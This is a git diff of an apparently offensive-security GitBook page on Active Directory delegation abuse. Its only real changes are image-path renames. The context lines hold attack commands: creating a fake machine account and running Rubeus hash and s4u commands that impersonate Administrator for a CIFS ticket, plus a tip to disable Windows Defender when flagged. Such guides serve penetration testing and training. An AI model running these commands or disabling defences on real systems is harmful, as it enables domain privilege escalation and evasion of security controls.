@@ -81,7 +81,7 @@ New-MachineAccount -Domain secure.local -Credential $creds -DomainController 10.
 Get-DomainComputer fake01 -Domain secure.local -Credential $creds -Server 10.0.0.100
 ```
 
-![](<../../../../.gitbook/assets/image (55) (1).png>)
+![](<../../../../.gitbook/assets/image (55) (1) (1).png>)
 
 7\. Now we need to create the raw security descriptor which we then will write to the attribute:
 
@@ -121,7 +121,7 @@ Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 <S
 .\Rubeus.exe hash /password:123456 /user:fake01 /domain:secure.local
 ```
 
-![](<../../../../.gitbook/assets/image (72) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (72) (1) (1) (1) (1).png>)
 
 {% hint style="info" %}
 Temporarily disable Windows Defender if it gets flagged by it.
@@ -133,7 +133,7 @@ Temporarily disable Windows Defender if it gets flagged by it.
 .\Rubeus.exe s4u /domain:secure.local /dc:10.0.0.100 /user:fake01 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:CIFS/data01.secure.local /ptt
 ```
 
-![](<../../../../.gitbook/assets/image (33).png>)
+![](<../../../../.gitbook/assets/image (33) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (59).png>)
 
